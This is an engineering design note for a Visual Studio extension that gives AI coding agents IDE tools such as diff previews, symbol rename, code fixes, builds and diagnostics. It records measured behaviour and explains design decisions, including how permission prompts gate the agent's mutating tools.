# VS-backed IDE services and tools (`CodeWicket.Ide`)

> The reasoning and measurements behind AGENTS.md's rules for the VS services and the
> agent-facing tools.

> **`#NN` refers to a private pre-release tracker.** The numbers are stable *names* for a failure
> mode, not links — the rule each one tags is stated here in full, so nothing is missing if you
> cannot open them.

> Terms used here without definition (the Exp hive, rungs, warm start, the prove-check verdicts, …) are
> in [AGENTS.md](../../AGENTS.md#terms-the-docs-use-without-defining-them).


**`CodeWicket.Ide`** — net472, the **real** VS-backed `IIdeServices` (loaded in-proc in devenv by the VSIX). `VsWorkspaceContext` (DTE: solution/active file/selection/open docs + Error List diagnostics), `VsEditApplier` (minimal-range edits via the editor `ITextBuffer` + native diff preview via `IVsDifferenceService`; **the incoming content first adopts the file's existing line endings** — `Core.Ide.LineEndings.Match`, in Core so its edge cases are unit-testable off the VS-bound project. Agents routinely send `\n` for a CRLF file, and applied verbatim that leaves the document MIXED, which (a) raises VS's **modal "inconsistent line endings" dialog** on the UI thread mid-turn, in front of the agent's own edit, and (b) silently degenerates `ComputeMinimalEdit` — the common prefix stops at the first line break, so a one-line change rewrites the WHOLE document, churning the undo stack, the diff preview and the git diff. ACP's write carries the full file, so matching also *repairs* an already-mixed file.

**Verified in Visual Studio, 2026-07-26, and the observed payload is subtler than "agents send `\n`":** the real Kiro `fs/write_text_file` for a CRLF file carried **15 CRLF + 1 lone LF** — existing lines round-trip with their endings and only the *edited* line arrives as `\n`. One lone LF is enough to trigger both failure modes above, so the fix earns its keep on a payload that is 94% correct. (The paired LF-file test is a no-op by construction — an LF payload into an LF file passes with the fix removed — so a same-ending test proves nothing; the mixed payload is the one to watch for.) A file with no line breaks yet (new/single-line) keeps what the agent sent; a lone `\r` is left alone.

**The edited document is then saved** — `TrySaveDocument`, scoped to that one file, best-effort, undo stack intact so Ctrl+Z still reverts and re-dirties. Without it the buffer write reached disk only incidentally, at the next build via VS's "Before building: Save all changes" option, so the agent's own shell (`git diff`, a `dotnet` run) and every on-disk reader saw pre-edit content until then — and a user with that option off would silently build/test stale output. It also makes this path agree with the other two edit routes: Kiro v2/Claude Code write disk themselves, `rename_symbol`/`apply_code_fix` save via `SaveChangedDocuments`. Only the **Kiro v3 client-fs** route reaches this applier, which is why the inconsistency was engine-specific.

**The write also RETURNS what it did** — `Core.Ide.FileWriteResult(ResolvedPath, OldText, NewText)`, the exact content either side of it — and that is the *authoritative* diff for this route, because we performed the write. The agent reports its own diff on the tool call afterwards, but that's its **claim** about the change and for a surgical edit carries only the **hunk**, which the viewer then has to widen by locating it in the current file (`TryBuildFullFileSides`: bails on repeated text with no reported line, on a match past `ReportedLineTolerance`=500, or on a hunk a later edit moved — falling back to a context-free hunk). `AcpClientTarget` stashes the result in `_writeCapture` keyed by `AcpMapper.NormalizeLocalPath(ResolvedPath)` and `AcpMapper.ResolveEditText` swaps **both** sides into the `EditProposed`, so that reconstruction is never needed for a write we applied.

**Both sides swap together, never one** — the agent's `newText` may be a hunk while the capture is whole-file, and pairing a hunk against a full-file before renders as a delete-the-whole-file diff.

**Keying is the correctness-critical part**: the incoming `fs/write_text_file` path may be *relative* (v3 sends `rawInput.path` as `"hello.txt"`) while the reported diff's is an absolute percent-encoded `file://` URI, so both sides must normalize identically or the enrichment silently never fires. The capture is **consumed on use** (exactly one enrichable frame — the completed `tool_call_update` — follows each write; a `str_replace`'s start frame is emitted *before* the write so it can't consume), and every miss falls through to the agent's reported text, i.e. the prior behaviour. `TryBuildFullFileSides` stays live for agent-written edits (Kiro v2, Claude), which never reach the client fs.

**Measured 2026-07-27 (in Visual Studio, with engine-channel.log): against Kiro v3 this was a NO-OP in outcome, and the fidelity argument that motivated it was WRONG.** The claim was that `str_replace` reports only a hunk, so removing the auto-opened diff window (which had shown true-before vs the live file) left the click path reconstructing. The capture says otherwise: the hunk appears only on the two **pre-write** frames (start + pending, `oldLen=64`), and the **completed** frame — the one after our write — carries full-file before/after (`321`/`484`) byte-identical to our capture. All three share one `toolCallId|path`, so they collapse onto one card that the completed frame wins, and `TryBuildFullFileSides` hits its `currentN == newN` guard and never reconstructs. So nothing was lost by the removal, and nothing is gained here yet. What IS proven live is the plumbing (`resolvedPath` — a field that didn't exist before — arrives in the `shell/edits/write` response carrying the full-file `oldText`); whether the swap then fired is **unobservable when both sources agree**. Keep it as correctness insurance — authoritative beats trusted, and it pays off for any agent whose post-write frame carries a blank or hunk-only diff — but do NOT re-justify it with a fidelity gap that this capture disproves.

**`[edit-capture]` logging says whether the swap changes anything**: two always-on lines per client-fs edit to engine stderr → `engine.log` — `stored` (per write, `AcpClientTarget`) and `applied=same|DIVERGED` (per consumed capture, `AcpMapper.LogCaptureOutcome`). `same` means the backend's own report already matched our write, so the swap changed nothing for that edit; `DIVERGED` means it corrected the card; a `stored` with no `applied` means the capture went unused (path forms didn't meet, or no post-write frame carried an edit — the synthesized-card case). The swap and the `IEditApplier` return value stay as correctness insurance whatever the log shows.

**The agreeing case is logged on purpose**: with divergence-only logging, "always correct" and "the swap never fired" are both silence, and the second would read as evidence to delete something that is actually broken.

**The comparison folds CRLF→LF** — `LineEndings.Match` gives our capture the file's real endings while agents report `\n`, so a raw compare would mark every write `DIVERGED` and the log would say nothing).

**The diff opens as a PREVIEW (provisional) tab, not a permanent one** — a diff read from a transcript card is a *glance* artifact, and a permanent tab leaves a user who clicks five cards with five tabs to close by hand — the same cost that rules out opening diffs unasked. Each new diff now takes over the single preview slot; promoting one is the standard gesture (double-click the tab / start editing).

**`__VSDIFFSERVICEOPTIONS` carries NO preview flag** (`vsshell110.idl:4141` — `DoNotShow`, `DetectBinaryFiles`, `PromptForEncodingForLeft/Right`, `Left/RightFileIsTemporary`, that's the whole enum), so it's set as **ambient document state** around the call: `using (new NewDocumentStateScope(__VSNEWDOCUMENTSTATE.NDS_Provisional, VSConstants.NewDocumentStateReason.Navigation))`. That helper is in the VSSDK's own `Microsoft.VisualStudio.Shell` — the Community Toolkit's `VS.Documents.OpenInPreviewTabAsync` is the same two lines, so **do NOT take a toolkit dependency for it**. Degrades by itself: preview tabs off (Tools > Options > Environment > Tabs and Windows), or an editor without provisional viewing, and the window still opens, just permanently.

**`OpenComparisonWindow2` does NOT dedupe** — an identical file pair builds another comparison window every call, which stays invisible while every tab is provisional (each preview replaces the last) but stacks a second tab the moment the user promotes one and re-clicks the card. So `VsEditApplier` remembers the frames it opens (`OpenDiff`, capped at `MaxRememberedDiffs`=16 since entries hold whole-file text) and re-activates a live match: keyed by **content, not path** (a second edit to the same file is a different diff and earns its own window — so one file can hold several live entries, each re-activated by its own card), liveness probed via `GetProperty(VSFPROPID_Caption)` **before** `Show()` so a dead frame falls through to opening fresh rather than making the click silently do nothing, and probed **only on the matched entry** — a sweep of every remembered frame would tax the common path (no match) with a COM call per entry to tidy a list that costs nothing. `Show()` activates without promoting, so re-clicking a still-provisional diff leaves it provisional.

**An edit card's "Open file" lands on the EDIT, and it gets there by looking, not by trusting the report.** It passed line 0 unconditionally, so every card opened at the top. The reported line is not the fix on its own: measured over 544 recorded edits, **381 (70%) carry no `locations[].line` at all**, and the ones that do report where the edit was *when it was made* — anything inserted above it since has moved the code out from under it. So `VsIdeServices.OpenFileAtDiffAsync` → `VsEditApplier.ResolveDiffLineAsync` reads the same source `ShowDiffPreviewAsync` reconstructs against (live buffer if open, else disk, same thread discipline and the same reasons) and hands it to `Core.Ide.DiffSideBuilder.LocateLine`, which **shares `LocateHunk` with `TryBuild`** — so the line this navigates to and the line in the diff window's caption cannot disagree about which of several identical hunks the edit was, including inheriting its refusal to guess between repeated text with no reported line. Two shapes because backends report edits both ways: a hunk is found in the file, a **whole-file write** (mirrored Kiro edit, where `newText` IS the file — the case `TryBuild` deliberately returns null for) resolves to the first line that actually changed, which puts a new file at line 1. The reported line survives only as the tie-breaker and the fallback; failing that, the top. **Shell-only, like `OpenFileAtLineAsync`** — a UI gesture terminating in the VS process, so no IPC and no Core-interface surface; the UI reaches it through a separate `openFileAtDiff` callback rather than `openFile` precisely because the line can only be resolved where the file can be read, and a host without one falls back to the reported line instead of 0. Pinned by `DiffSideBuilderTests` (`LocateLine_*`) and `EditCardNavigationTests`, both verified load-bearing by re-injecting the line-0 behaviour.

**Rejected after testing (2026-07-27): moving the reuse check AHEAD of the reconstruction + the two whole-file writes** (keyed on the edit as reported instead of on the reconstructed content) to make a repeat click skip them — in Visual Studio it felt identical, so the ~20 lines and the stale-context trade-off it introduced bought nothing. The residual click cost is VS building the comparison window, which we only trigger; measure before touching it again. `VsPermissionHandler` (msgbox fallback), `VsToolCatalog` (every agent-facing IDE tool; the descriptors, and so the list, are `Core.Ide.IdeToolDescriptors`), `VsIdeServices.CreateAsync()` composite.

**The `find_*` tools are semantic, sourced from VS's live `VisualStudioWorkspace` (Roslyn `SymbolFinder`) — we do NOT ship Roslyn: the `Microsoft.VisualStudio.LanguageServices` ref is compile-only (`ExcludeAssets="runtime"`), devenv provides the runtime assemblies, so there's no second Roslyn to conflict with VS's. The workspace is an optional MEF import (null → those tools aren't registered).** The old "no Roslyn dep" rule was really "no BYO Roslyn assemblies," not "no semantic tools." The semantic triad: **`find_references`** = who *uses* this (usage side, source-only); **`find_symbol`** = where/what is this *declared* (declaration side; **deliberately includes metadata** symbols from referenced packages/BCL a text search can't reach); **`find_implementations`** = what *realizes/extends* this (down the hierarchy — kind-dispatched: interface/interface-member→implementations, class→derived, virtual/abstract member→overrides). The read-only three share `ResolveSymbolsAsync(sourceOnly)` + `BuildSymbolMatch`/`SymbolKey`.

**`rename_symbol`** is the one **mutating** tool: `Renamer.RenameSymbolAsync` → a new `Solution` applied via `VisualStudioWorkspace.TryApplyChanges` **on the UI thread** (so it lands in open buffers + the editor undo stack — undoable with Ctrl+Z, NOT the ACP edit-mirror path the backends use). Safety rails: source-only, refuses ambiguous names (returns candidates, makes no change), validates the new identifier, conservative `SymbolRenameOptions` (no rename in strings/comments/overloads/file).

**MCP tool calls ARE gated by our permission banner** — corrected 2026-07-26 from a live acp.log: Kiro sends a `session/request_permission` for *every* MCP tool call, titled `@code-wicket/<tool>` with `_meta.kiro.consent.capability:"mcp"` + `resource:"code-wicket/<tool>"` and the full four options. `capability:"mcp"` is deliberately **not** in the kind-derivation map (it says nothing about what the tool does), so these arrive **unkinded** and the risk resolves by **name** instead — exactly the path `IdeMcpServer.TryResolveLocalTool` + `ToolDescriptor.Risk` exist for. So `rename_symbol`/`apply_code_fix` (authored `Edit`) prompt under Prompt/AcceptReads and auto-allow from AcceptEdits up. VS undo is the *second* safety net, not the only one — and note the banner fires **before** the tool runs, with the call's arguments already cached, which is what makes a pre-apply preview possible at all.

**Scope = C#/VB only (Razor/markup NOT updated):** calling Roslyn's `Renamer` directly renames the C# documents in the workspace but leaves `.razor`/`.cshtml` markup references behind — Razor's C# is generated + position-mapped by a *separate* tooling layer (the Razor LSP), and that coordination is one-directional (renaming *from* Razor delegates into C#; renaming from C# has no callback back into Razor). So `rename_symbol` matches VS's own **C#-initiated Rename** exactly (F2 by default; Rename only touches Razor when *started from* the `.razor`). `find_references` shares the blind spot (won't list markup usages). Not a silent break: a stale `.razor` reference fails the build (source-generated Razor won't compile), so `build_solution` is the backstop — hence the tool description's "C#/VB only — build afterward to catch other usages." **Disk persistence:** `TryApplyChanges` lands edits for *open* docs as *dirty buffers* (unsaved) while writing *closed* docs straight to disk; a shared `SaveChangedDocuments(old,new)` then saves *only* the changed files (matched against `DTE.Documents` by path — NOT a global Save-All that'd grab the user's unrelated edits; undo stack survives so Ctrl+Z still reverts). Both mutating tools call it after `TryApplyChanges` on the UI thread, so disk matches the editor.

**`apply_code_fix`** is the second mutating tool: applies VS's own light-bulb fix for a diagnostic at a `file`+`line` using the IDE's live `CodeFixProvider`s (imported via `IComponentModel.GetExtensions<CodeFixProvider>()`, passed into `VsToolCatalog`; needs compile-only `Microsoft.CodeAnalysis.Features`). Diagnostics gathered on the line = compiler (semantic model, reliable) + best-effort analyzer diags (span-scoped semantic **+ syntax** passes, try/caught — some analyzers/fixers don't run headlessly, so they're skipped) from `CollectFixableAnalyzers`: project `AnalyzerReferences` ∪ solution-level `AnalyzerReferences` ∪ **the VS-hosted IDE style analyzers (IDE####)**, which live in *no* AnalyzerReference — they're reflected out of the `Microsoft.CodeAnalysis.[CSharp./VisualBasic.]Features` assemblies **devenv has already loaded** (attribute-matched `[DiagnosticAnalyzer]` types, parameterless-ctor, `DocumentDiagnosticAnalyzer`s skipped, per-type guarded, cached per language — consistent with no-BYO-Roslyn: we instantiate from loaded assemblies, never load our own). Diagnostics deduped by `(id, span)` so a doubly-registered rule (SDK NetAnalyzers + VS's hosted copy) can't fabricate a false "N fixes apply" ambiguity; analyzer results require `Location.IsInSource` (keeps AD0001 crash-report diags off line 1).

**Hidden-severity diagnostics are included only when `diagnosticId` names them explicitly** (IDE style rules like IDE0005 remove-unnecessary-usings default to hidden yet carry a fix; the tool description tells the agent to pass the id). Multiple **distinct** fixes with no `fixTitle` → returns choices (grouped by title, with an `occurrences` count), no change (fail-loud like rename) — but candidates that are **all the same fix** apply the first instead, reporting `sameFixRemaining` so the caller re-runs. Listing N identically-titled choices was a **dead end, not a safety rail**: `fixTitle` is the only selector the caller has, so it cannot tell them apart (observed live — two IDE0055 "Fix formatting" on one line, from two diagnostics at different columns, which the `(id, span)` dedupe doesn't merge because the spans genuinely differ). The guard exists to stop us picking silently between *different* actions ("add using" vs "generate method"); identical titles give it no work to do.

**Every diagnostic/fix the tool reports now carries its 1-based `column`** (the applied one, the listed choices — grouped by title with `occurrences` + the `columns` they sit at — and the remaining `sameFixRemainingColumns`), and an optional **`column` argument** narrows to one of several same-id diagnostics on the line, doing for position what `diagnosticId` does for the id. It stays *optional*, not the required disambiguator: the common case is identically-titled fixes the caller wants applied anyway, where apply-first-and-report is less work than making it choose a position it has no basis to rank — and column isn't a complete discriminator regardless (the issue-#47 CS8602 pair shared a start column and differed only in end). Applies the `ApplyChangesOperation.ChangedSolution` via `TryApplyChanges` (undoable).

**`scope:"document"` collapses "fix every IDE0055 in this file" into ONE call** (issue #91), through Roslyn's own `FixAllProvider` — the mechanism behind the light bulb's "Fix all occurrences in Document". The one-at-a-time shape wasn't merely slow: N occurrences meant N tool calls and N turns, and it is what made the stale-`sameFixRemaining` loop possible at all, because the tool had to hand the agent a "there are more, re-run" instruction that could be wrong. **Only how the `CodeAction` is PRODUCED changes** — from `GetOperationsAsync` down (the `ApplyChangesOperation`, `SummarizeSolutionChangesAsync`, the no-op guard, `TryApplyChanges` + `SaveChangedDocuments`) the two scopes are the same code, which is why this is a small change to a tool with a lot of hard-won behaviour in it.

Four things it turns on. **The seed is a RULE, not a position**: `diagnosticId` becomes required and `line` optional (it then only picks *which* occurrence's offered fix is the template), and each scope's requirement is checked separately so the error names the one missing argument. **The identity is `EquivalenceKey`, not `Title`** — what Roslyn's own light bulb passes here. A **null** key is passed through rather than refused: the batch fixer then matches the other null-keyed actions, which is exactly what VS does with the same action, and the ambiguity guard has already refused the case where distinct fixes were on offer and none was chosen.

**And that key stops at fix-all — the line scope keeps comparing `Title`, measured.** Issue #91 raised, as an aside, that `sameFixRemaining` and `CountSameTitleFixesAsync` compare title *strings* to decide whether two fixes are the same, and that `EquivalenceKey` is "the sanctioned answer to that question and probably the better key even if fix-all is never built". It is not, and the probe that settled it ran the **real** C# fixers offline (`Microsoft.CodeAnalysis.CSharp.Features` 4.14 over an `AdhocWorkspace`, providers reflected out of the assembly the way the tool reflects its analyzers). Three shapes, and the swap is **identical, worse, identical**:

| shape | Title | EquivalenceKey |
|---|---|---|
| IDE0055 ×3 on one line | `Fix formatting` (all three) | `AbstractFormattingCodeFixProvider` (all three) |
| flat add-using | `using System.Text;` | `using System.Text;` — verbatim equal |
| **CS0103 ×2, SAME name, one line** | `Generate variable 'alpha'` (both) | `…;38944327;33772669;` vs `…;49489088;25897426;` — **differ** |

The third row is the refutation. A grouped action's key **embeds per-occurrence hash codes**, so it is *not* location-independent: for one fix offered at two sites it says "two different fixes" where the title correctly says one. Key the sibling count on it and the ambiguity guard fires, the caller is told "2 different fixes apply here; re-issue with `fixTitle`" — and `fixTitle` cannot separate two **identical** titles. That is precisely the dead end the guard's own comment records having escaped from, reintroduced. Where the key is safe it is also pointless (rows 1–2 change nothing). The premise is right about which question Roslyn *designed* the key for and wrong that it is the same question: fix-all matches it against actions it **recomputes inside one operation**, never across independently registered ones — which is why the same field is correct in `FixAllContext` and wrong in a sibling count. **Exactly ONE diagnostic is asked for its fixes** — interrogating every provider about every occurrence would be precisely the N calls the scope exists to remove — and it is the first by position, so which occurrence seeds it is deterministic rather than analyzer-order. And **the post-apply re-check is unconditional here**, where the line scope only pays for it when there were siblings: fix-all is not guaranteed exhaustive (a provider may decline occurrences it can't merge), and "the file is done" is the claim a caller acts on without verifying. `CountSameTitleFixesAsync` now takes a nullable line (null ⇒ whole document) and reports on the axis the scope works in — columns on one line, `sameFixRemainingLines` across a file.

**A provider opting out of fix-all is ORDINARY, so the degradation is stated rather than silent.** `GetFixAllProvider()` returning null is a supported choice, and computing the fix-all can fail; either way the single fix is still worth applying, but a caller that asked to fix the *file* and reads "Applied" would reasonably stop there. So `scopeApplied` reports what actually ran — never what was requested — and the reason goes in the **summary prose**, because that is the half that gets weighted (same rule as `IsError`, above). Fix-all is an accelerator, not a replacement: the one-at-a-time path stays.

**Capped at Document, and that is a permission decision before it is an API one.** `FixAllScope` also offers Project and Solution, and risk resolves by tool **name** (`apply_code_fix` is authored `Edit`), so a solution-wide fix-all would auto-approve under AcceptEdits identically to a one-line fix — a materially different edit than the tier was reasoned about for. Three options were weighed (a distinct tool name carrying `ToolRisk.Command`; deriving risk from the arguments, which cuts against the name-keyed model that is the *only* reliable signal for Kiro's unkinded `request_permission`) and the cap won: one approval, one file, no second tool for the model to choose between. `project`/`solution` therefore get their **own** refusal naming the alternative (call once per file) rather than the generic unknown-scope one — they are values a model may reasonably try. Widening it means settling that first **and** implementing `DocumentDiagnosticProvider`'s project-wide members, which are unreachable at this scope and answer empty: an empty answer there would fix nothing while reporting success, the one outcome the result contract forbids.

**A light-bulb SUBMENU is not a fix, and offering one as though it were made every generate-style fix unreachable** (issue #142, found by the same probe). `RegisterCodeFixesAsync` hands back a `CodeAction` that may carry `NestedActions` — what VS renders as a submenu — and Roslyn's `CodeActionWithNestedActions` **throws `NotSupportedException` out of `GetChangedDocumentAsync`**. The tool collected only the top-level actions, so it offered the group, applied the group, and handed the agent:

```
the fix could not be computed: Microsoft.CodeAnalysis.CodeActions.CodeAction+CodeActionWithNestedActions
```

A bare .NET type name, with the applicable children never collected and therefore unreachable by `fixTitle` either. **Generate variable / field / property / local / parameter / type / class were all unavailable, and always had been** — while flat actions (`"using System.Text;"`, `nested=0`, `ops=1`) applied fine — which is why the failure was invisible: the proven path is the flat one. `ApplicableActions` now recurses to the leaves, dropping the group: it cannot be applied, so offering it is offering a choice that fails, and `"Generate field 'alpha'"` names itself well enough to stand alone. One knock-on is deliberate — two same-named CS0103 on a line used to share one title and **auto-apply straight into the throw**; flattened they present five genuinely different fixes and the ambiguity guard asks, which is the right question and one it could not previously see.

**And flattening introduces a hazard it must then close: an INTERACTIVE fix.** `"Generate new type..."` is a leaf, and offline it throws `InvalidOperationException: Service of type 'IGenerateTypeOptionsService' is required ... not available from 'Custom' workspace`. **Inside devenv that service exists**, so the same action would not fail — it would raise a **modal dialog on the UI thread mid-turn** and wait for a person. That is the line-endings-dialog failure mode reached from a different direction, and it is a hazard *this change* would have created rather than one it inherited. There is no public API for "needs UI", so `IsInteractive` ORs two signals — the **ellipsis** (the Windows/VS convention for "opens a dialog", which survives a runtime rename) and **`WithOption`** in the runtime type name (Roslyn's own naming, which survives localization). Swept over 17 leaves from six diagnostics they agreed exactly, flagging the two `"Generate new type..."` leaves and nothing else, so ORing costs nothing now and degrades better later. Biased on purpose: dropping a workable fix costs one choice the caller can route around, admitting one that blocks devenv hangs the turn with no way out from the agent's side — and against the status quo nothing is lost either way, since none of these leaves was reachable at all before.

The measurement (`Microsoft.CodeAnalysis.CSharp.Features` 4.14 over an `AdhocWorkspace`, providers reflected out of the assembly the way the tool reflects its analyzers) before and after:

```
before   "Generate variable 'alpha'": nested=5 THREW NotSupportedException
after    CS0103: registered=1 offered=5 -> every offered fix applies
         CS0246: registered=3 offered=5 -> every offered fix applies   ("Generate new type..." filtered)
```

**The guard is permanent, and paying for it meant taking a real Roslyn runtime into two dev-only projects.** The defect survived because **nothing outside devenv ever called `GetOperationsAsync` on a registered action** — the Ide project holds Roslyn compile-only (`ExcludeAssets="runtime"`), which is correct for shipping and is precisely what made a whole class of fix permanently broken under a green build. So `Microsoft.CodeAnalysis.CSharp.Features` 4.14 (the version Ide compiles against) is referenced with its **runtime assets** by `CodeWicket.Tests` and `CodeWicket.Console`. **Neither is in the VSIX**, so no Roslyn is redistributed — verified by checking the extension's output for `Microsoft.CodeAnalysis.*`, which is the standing check for this, not a one-off.

The logic moved to **`Ide/CodeFixActions.cs`** and is **linked** into both (`<Compile Include>`), the `BuildStamp.cs` pattern: a net472 VSSDK project cannot be referenced from net10, and the point is to compile *the same source*, not a copy of it. The file pins its own `#nullable` because the three projects disagree about it. The harness that drives it, `CodeFixProbe`, is homed in `Console` and linked into `Tests` — running the real fixers is a proof activity, and the two consumers want different things: `Console codefix-actions` prints the registered tree, its leaves and each one's verdict, which is what you read when a test reports the premise has changed; the tests give a verdict on every run and cannot show you *what the fixers now register*.

**The suite pins the PREMISE as well as the fix.** If a future Roslyn made a grouped action applicable, the flattening would be unnecessary rather than wrong — and a guard that quietly kept passing would leave nobody a way to notice — so `GroupedAction_IsRegisteredAndCannotBeApplied` fails loudly instead, as does the proof's `PREMISE CHANGED:` line.

Injecting each bug to check the guards are load-bearing shows two things:

- **The two `IsInteractive` signals are completely redundant on the provider set measured.** Deleting *either* one left the entire suite green, because each independently catches the real `"Generate new type..."` leaf — which is the same fact as "swept 17 leaves, both agreed exactly", read from the other side. Redundancy is what the OR is *for*, but it also means one arm could be deleted later with nothing objecting, so the type-name arm is pinned synthetically by `TypeNameSignal_IdentifiesADialogFix_EvenWithoutAnEllipsis` (a `CodeAction` subclass whose type name carries `WithOption` and whose title has no ellipsis).
- **A sweep over leaves cannot see this bug, because the broken build offers a thing that is not a leaf.** A proof that walks every leaf and asks whether each applies passes with the flattening removed, reporting "every offered fix applies" while the tool offers exactly the group that throws. Rows are now built **offered-first**, then the withheld leaves. The general form is worth remembering: *iterate what the code under test actually produced, not what you expect it to have produced* — an expectation-shaped traversal agrees with the code by construction.

**The decision half lives in `Core.Ide.CodeFixScopes`** (`TryParse` + `Validate`), extracted for the same reason `FilePathMatch` was — the tool catalog is net472 + VS SDK + Roslyn and the test project cannot reference it, so a rule left in there is a rule no test can reach. The Roslyn half (building the `FixAllContext`, running it) stays put and needs a live devenv. `FixAllContext.DiagnosticProvider` is fed from the tool's **own** analyzer pass, so a diagnostic the tool can fix one at a time is one fix-all can see.

**Not verified in a live Visual Studio instance: the IDE-analyzer path** (whether specific style analyzers fire headlessly with VS's option flow) **and fix-all itself** — both need the live `VisualStudioWorkspace` and imported `CodeFixProvider`s, so nothing offline reaches them. Two things to check first, both from the issue: that a real `IDE0055` fix-all actually changes something (an `IDE0055` can offer a fix that returns an identical solution, where VS's own light bulb does nothing either — so confirm VS's *fix-all* changes something before reading a no-op as ours), and that a provider which opts out reports the degradation rather than a bare "Applied". Compiler-diagnostic fixes (add-using/implement-interface/generate-member) remain the core proven in Visual Studio.

**Compiler diagnostics come from the live Roslyn workspace, NOT the async Error List's IntelliSense half** — that half lags a just-applied edit (a compiler `; expected` lingered after the agent fixed it; the open buffer was proven NOT stale — VS auto-reloads it — so it was VS's *async live re-analysis* trailing an already-correct buffer, and reloading buffers fixed nothing). `Compilation.GetDiagnostics()` is synchronous + buffer-accurate. `get_diagnostics` is pure Roslyn for CS/BC; `build_solution` adds the *build-produced* Error List rows on top (it just built, so those are fresh — see the build-view union below).

**`get_diagnostics` takes a nested `scope`:** `compiler` (Roslyn CS/BC, deterministic — but reflects VS's *current in-memory analysis*, incomplete until the workspace warms, so "build first" for the full set) ⊂ `analyzers` (+ `WithAnalyzers` over `project.AnalyzerReferences`) ⊂ `full` (+ the live Error List's non-compiler entries — the ONLY source for editor-hosted SonarLint-VSIX and SDK/NuGet diagnostics like NETSDK####/NU#### that the C# compiler can't emit). Union de-duped by `DiagnosticDeduper` (Core, unit-tested) — **two-tier**: WITHIN a source the key is the diagnostic's **full span** for Roslyn rows (`(file,line,column,endLine,endColumn,code)`) and start-only for Error List rows (the table exposes no end span), so distinct same-line diagnostics survive — the real issue-#47 pair was two CS8602 at `(68,28,68,40)` and `(68,28,68,59)`, same start column, which a start-only key merged (`get_diagnostics` under-counted the build by one); ACROSS sources it stays **coarse** `(file,line,code)` so an Error List copy collapses onto the Roslyn row even when the two disagree on the column (VS's live analysis is a possibly-different snapshot — column-matching it isn't reliable). Roslyn rows carry `endColumn` (+`endLine` when multi-line) in the payload so a same-start pair doesn't read as a duplicated row. Source-precedence `compiler>analyzer>errorList` (preserved by add order), each row carries a `source`; CS/BC are dropped from the Error List (Roslyn is authoritative → this is what actually kills the stale-`; expected` bug).

**Also `severity`** (min-severity floor: `error`/`warning` (default = classic Error+Warning)/`info`/`hidden`) **and `file`**; an unknown `scope` or `severity` value fails loud (a typo'd `scope:"analyzer"` silently falling back to compiler would read as "no analyzer findings") (restrict all sources to one file; skips non-owning projects and makes the analyzer pass document-scoped).

**The VS-hosted IDE style analyzers join the `analyzers` pass ONLY when `file` is given AND the floor is below `warning`** — their output is hidden/info-tier (a Warning floor would filter it all), solution-wide they're too slow/noisy, and visible IDE#### rows for open files already ride in via `full`'s Error List (whose read honors the floor too — an `info` floor admits the Messages tier; the Error List never holds Hidden). So the style-cleanup recipe the tool description teaches the agent: `get_diagnostics {scope:"analyzers", severity:"hidden", file:X}` to discover (also surfaces the hidden *compiler* CS8019 unnecessary-using), then `apply_code_fix` with the id.

**`build_solution`** reports `succeeded` from `LastBuildInfo`; its error/warning details are the **build's OWN diagnostics** = the real build's `ErrorSource.Build` Error List rows (`CollectBuildDiagnosticsAsync`→`AddBuildSourceDiagnosticsAsync`), **NOT Roslyn**. build_solution just ran a real build, so the build is ground truth — and Roslyn's design-time view is unreliable here in BOTH directions: it *misses* real build errors it structurally can't see (generated-code CS#### like the issue-#47 WCF CS0104, build-only NU/MSB/NETSDK), and it *invents* ones the build doesn't have (measured in Visual Studio, 2026-07-24: a cold/half-warmed workspace reported 4× CS0122 "inaccessible due to protection level" for an `InternalsVisibleTo` the real build honored — on a build that SUCCEEDED, `projectsFailed:0`, so `succeeded:true`+`errorCount:4`; all `source:"compiler"`). The `ErrorSource.Build` filter (`StandardTableKeyNames.ErrorSource`, enum `Build`/`Other`; a missing key = excluded) already keeps the lagging IntelliSense half out, so the sole historical reason Roslyn was used here (dodging that lag) no longer applies — dropping it loses nothing and kills both failure modes. `get_diagnostics` is untouched — it deliberately stays the **live-buffer view** (Roslyn only; build-source rows would go stale after an unbuilt edit, the phantom-error class its `excludeCompilerCodes` guard prevents). Divergence between the two tools is intentional: `build_solution` = "what the build produced", `get_diagnostics` = "what live analysis sees now".

**The Error List posts build rows ASYNCHRONOUSLY after `vsBuildStateDone`** (measured in Visual Studio, 2026-07-24, confirmed on fast *incremental* builds): a read at build-done is stale either way — a failed build's CS1002 not yet posted (`errorCount:0`), or a just-fixed build's old CS1002 not yet cleared (phantom `errorCount:1` on a build that *succeeded*; warnings likewise half-repopulated, `2` of `28`). This is the SAME async-Error-List lag that drove the original Roslyn choice (the stale-`; expected`) — #47 reintroduced it. Fix = **converge, don't just settle**: `CollectBuildDiagnosticsConvergedAsync` polls the build rows until their error PRESENCE matches `LastBuildInfo` (the synchronous build-outcome oracle — no text parsing) AND the set stops changing across two ~150ms samples, ≤4s. Then trust the outcome: a **succeeded** build has no compile errors by definition (a compile error fails its project → `projectsFailed>0`), so any error-severity row is stale and dropped. A failed build that leaves **no** structured rows (target crash / pre-build-event failure, or convergence timing out) attaches a trimmed tail of the Build output pane (`ReadBuildOutputTailAsync`, well-known `BuildOutputPane_guid`) — the synchronous authoritative record — as the fallback so it's never "failed with 0 errors" (issue #47). Note incremental builds only post the *recompiled* projects' rows, so counts are build-scoped (a full `rebuild:true` gives the whole solution). `build_solution` takes `rebuild` (Clean+Build vs incremental) and an optional `project:<name>` to scope the build (via `SolutionBuild.BuildProject`, matched against each project's Solution Explorer display name — ambiguous/unknown names fail loud with the available names listed) to a single project instead of the whole solution; the reported diagnostics are scoped to that project too (`CollectDiagnosticsAsync`'s new optional project filter, used only by `build_solution` — `get_diagnostics` is unaffected).

**The source dropdown gates PUBLICATION, not display — so the read widens it, then reads the table's DATA** (issue #93). The Error List's "Build / IntelliSense / both" dropdown is not a view over a fixed row set: it is a field on the data source (`ErrorListDataSource._errorListView`, confirmed in the debugger) and it decides what gets published to the table at all. Measured on one solution with nothing changing but the dropdown: **IntelliSense Only** → `sourceRows=0`, `warningCount:0` on a build that emitted 28 warnings; **Build + IntelliSense** → `sourceRows=28`, every row marked `Build`, all 28 kept. **No read-side change reaches this** — the rows are never published, and the loss is upstream in VS, a long-standing defect ([roslyn#16545](https://github.com/dotnet/roslyn/issues/16545), [#19693](https://github.com/dotnet/roslyn/issues/19693), [#21019](https://github.com/dotnet/roslyn/issues/21019), [#74380](https://github.com/dotnet/roslyn/issues/74380), [#81109](https://github.com/dotnet/roslyn/issues/81109); the last closed as *not planned*, with "flip to Build Only" as the official workaround). The lever turned out to be **public on the `IErrorList` the catalog already held**: `AreBuildErrorSourceEntriesShown` / `AreOtherErrorSourceEntriesShown`, both settable. 